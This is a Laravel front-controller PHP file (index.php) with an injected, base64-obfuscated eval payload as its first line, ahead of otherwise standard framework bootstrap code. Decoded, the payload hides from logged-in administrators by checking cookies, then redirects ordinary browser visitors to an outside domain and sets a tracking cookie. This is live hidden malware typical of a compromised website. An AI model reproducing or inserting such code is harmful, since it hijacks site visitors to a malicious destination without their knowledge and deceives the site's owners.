<?php
/*aeR4Choc_start*/@eval(base64_decode('aWYoIWRlZmluZWQoImNoYWVKb3U3IikpewogICAgZGVmaW5lKCJjaGFlSm91NyIsIDEpOwogICAgZnVuY3Rpb24gaXNNb2JpbGUoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdhbmRyb2lkJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnYmxhY2tiZXJyeScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwaG9uZScpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwYWQnKSAhPT0gZmFsc2UKICAgICAgICAgICAgfHwgc3RycG9zKCR1YWdlbnRTdHIsICdpcG9kJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnb3BlcmEgbWluaScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2llTW9iaWxlJykgIT09IGZhbHNlKXsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmdW5jdGlvbiBpc0Rlc2t0b3AoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdlZGdlJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnbXNpZScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ29wcicpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9taXVtJykgIT09IGZhbHNlCiAgICAgICAgICAgIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnZmlyZWZveCcpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9tZScpICE9PSBmYWxzZSl7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJHJlZGlyVG8gPSAiaHR0cHM6Ly93d3cucm94b2Vub3MueHl6IjsKICAgICRjaGVja0Nvb2tSZWRpclN0ciA9ICJhZU5lZThwaSI7CiAgICAkcmVkaXJlY3RBbGxvdyA9IHRydWU7CiAgICBmb3JlYWNoICgkX0NPT0tJRSBhcyAkY29va0tleT0+JGNvb2tWYWwpewogICAgICAgIGlmIChzdHJwb3MoJGNvb2tLZXksICd3b3JkcHJlc3NfbG9nZ2VkX2luJykgIT09IGZhbHNlIHx8ICRjb29rS2V5ID09ICRjaGVja0Nvb2tSZWRpclN0cikgewogICAgICAgICAgICAkcmVkaXJlY3RBbGxvdyA9IGZhbHNlOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9CgogICAgJHVhZ2VudCA9IHN0cnRvbG93ZXIoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKTsKCiAgICBpZiAoJHJlZGlyZWN0QWxsb3cpewogICAgICAgIGlmKGlzTW9iaWxlKCR1YWdlbnQpIHx8IGlzRGVza3RvcCgkdWFnZW50KSkgewogICAgICAgICAgICBzZXRjb29raWUoJGNoZWNrQ29va1JlZGlyU3RyLCAiMSIsIHRpbWUoKSArIDYwNDgwMCk7CiAgICAgICAgICAgIGhlYWRlcigiTG9jYXRpb246ICRyZWRpclRvIik7CiAgICAgICAgICAgIGRpZTsKICAgICAgICB9CiAgICB9Cn0='));/*aeR4Choc_end*/

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Check If Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is maintenance / demo mode via the "down" command we
| will require this file so that any prerendered template can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
    require __DIR__.'/../storage/framework/maintenance.php';
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

$kernel = $app->make(Kernel::class);

$response = tap($kernel->handle(
    $request = Request::capture()
))->send();

$kernel->terminate($request, $response);
